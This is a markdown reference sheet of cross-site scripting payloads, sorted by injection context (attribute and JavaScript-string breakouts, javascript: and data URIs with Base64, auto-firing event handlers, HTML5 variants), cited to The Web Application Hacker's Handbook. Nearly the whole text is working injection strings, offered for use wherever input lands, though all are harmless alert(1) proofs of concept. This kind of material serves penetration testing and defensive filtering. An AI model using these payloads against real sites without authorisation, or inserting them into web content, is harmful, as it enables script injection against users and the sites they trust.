# Context-Specific Payloads

## What it is

These examples are grouped by the rendering context shown in the original notes: HTML attributes, inline script, URL-bearing attributes, data URIs, and auto-triggered elements.

## When it applies

Use these when your input lands inside an existing attribute, script block, hyperlink, embedded object, or another context with its own escaping rules.

## Example

### Breaking out of an HTML attribute value

```html
<input type="text" name="address1" value="myxsstestdmqlwp">
"><script>alert(1)</script>
" onfocus="alert(1)
```

### Breaking out of a JavaScript string

```html
<script>var a = 'myxsstestdmqlwp'; var b = 123; ... </script>
'; alert(1); var foo='
```

### URL-bearing attributes

```html
<a href="myxsstestdmqlwp">Click here ...</a>
javascript:alert(1);
#"onclick="javascript:alert(1)
```

### Data URIs and Base64

```html
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
Click here</a>
```

The Base64-encoded string in the preceding examples is:

```html
<script>alert(1)</script>
```

### No user interaction

```html
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
```

### HTML5 no-user-interaction variants

```html
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```

### Closing tags and HTML5 event handlers

```html
</a onmousemove=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

### Script pseudo-protocols

```html
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

## Notes

The original page mixed together payloads for several contexts; this split keeps them together by where the input lands.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 12090, 12094-12095, 12120, 12184-12189, 12194-12204, 12207, 12209-12216, 12223). Wiley. Kindle Edition.
